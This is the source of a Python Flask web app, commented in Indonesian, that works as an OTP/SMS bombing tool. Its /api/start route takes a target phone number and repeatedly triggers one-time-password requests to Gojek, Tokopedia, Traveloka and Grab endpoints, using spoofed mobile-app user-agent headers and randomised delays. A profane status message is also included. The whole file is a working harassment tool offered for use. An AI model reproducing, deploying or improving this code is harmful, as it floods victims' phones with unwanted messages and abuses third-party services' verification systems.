from flask import Flask, request, jsonify, send_from_directory
import requests
import time
import random
import uuid
import os

app = Flask(__name__, static_folder='../public')

# Route buat frontend
@app.route('/')
def serve_frontend():
    return send_from_directory('../public', 'index.html')

@app.route('/api/start', methods=['POST'])
def start_spam():
    try:
        data = request.json
        phone = data.get('phone', '').strip()
        count = int(data.get('count', 10))
        
        # Validasi nomor
        if not phone or not phone.isdigit() or len(phone) < 10:
            return jsonify({
                'error': 'Nomor HP ga valid, minimal 10 digit!',
                'success': False
            }), 400
        
        # Batasi count karena Vercel lemah
        if count > 30:
            count = 30
            
        print(f"[LOG] Mulai spam ke {phone} sebanyak {count}x")
        
        # List API endpoints (yang work)
        endpoints = [
            {
                'name': 'Gojek',
                'url': 'https://api.gojekapi.com/v3/customers/request_otp',
                'method': 'POST',
                'headers': {
                    'User-Agent': 'Gojek/4.59.1 (Android; 12)',
                    'X-AppVersion': '4.59.1',
                    'Content-Type': 'application/json'
                },
                'data': {'phone': f'+62{phone}'}
            },
            {
                'name': 'Tokopedia',
                'url': 'https://accounts.tokopedia.com/token/request',
                'method': 'POST',
                'headers': {
                    'User-Agent': 'okhttp/4.9.2',
                    'X-Platform': 'android',
                    'Content-Type': 'application/json'
                },
                'data': {'phone': phone, 'source': 'register'}
            },
            {
                'name': 'Traveloka',
                'url': 'https://api.traveloka.com/v3/otp/request',
                'method': 'POST',
                'headers': {
                    'User-Agent': 'Traveloka/3.45.0 (Android; 12)',
                    'Content-Type': 'application/json'
                },
                'data': {'phoneNumber': f'+62{phone}', 'countryCode': 'ID'}
            },
            {
                'name': 'Grab',
                'url': 'https://api.grab.com/v2/otp/request',
                'method': 'POST',
                'headers': {
                    'User-Agent': 'Grab/8.98.0 (Android; 12)',
                    'Content-Type': 'application/json'
                },
                'data': {'phoneNumber': f'+62{phone}', 'countryCode': 'ID'}
            }
        ]
        
        results = {
            'total': count,
            'success': 0,
            'failed': 0,
            'details': []
        }
        
        # Kirim OTP
        for i in range(count):
            for ep in endpoints:
                try:
                    if ep['method'] == 'POST':
                        res = requests.post(
                            ep['url'],
                            json=ep['data'],
                            headers=ep['headers'],
                            timeout=5
                        )
                    else:
                        res = requests.get(
                            ep['url'],
                            params=ep['data'],
                            headers=ep['headers'],
                            timeout=5
                        )
                    
                    status = 'success' if res.status_code in [200, 201, 202] else 'failed'
                    
                    if status == 'success':
                        results['success'] += 1
                    else:
                        results['failed'] += 1
                    
                    results['details'].append({
                        'service': ep['name'],
                        'status': status,
                        'code': res.status_code
                    })
                    
                    print(f"[{ep['name']}] {status.upper()} - {res.status_code}")
                    
                except Exception as e:
                    results['failed'] += 1
                    results['details'].append({
                        'service': ep['name'],
                        'status': 'error',
                        'message': str(e)
                    })
                    print(f"[{ep['name']}] ERROR - {str(e)}")
                
                time.sleep(random.uniform(0.5, 1.5))
            
            time.sleep(2)
        
        return jsonify({
            'success': True,
            'results': results,
            'message': f'Selesai! {results["success"]} sukses dari {results["total"]} percobaan'
        })
        
    except Exception as e:
        return jsonify({
            'error': str(e),
            'success': False
        }), 500

@app.route('/api/health')
def health():
    return jsonify({
        'status': 'hidup kontol!',
        'message': 'DHEKZEDAN v8.0 siap tempur!'
    })

# Ini penting buat Vercel
app = app
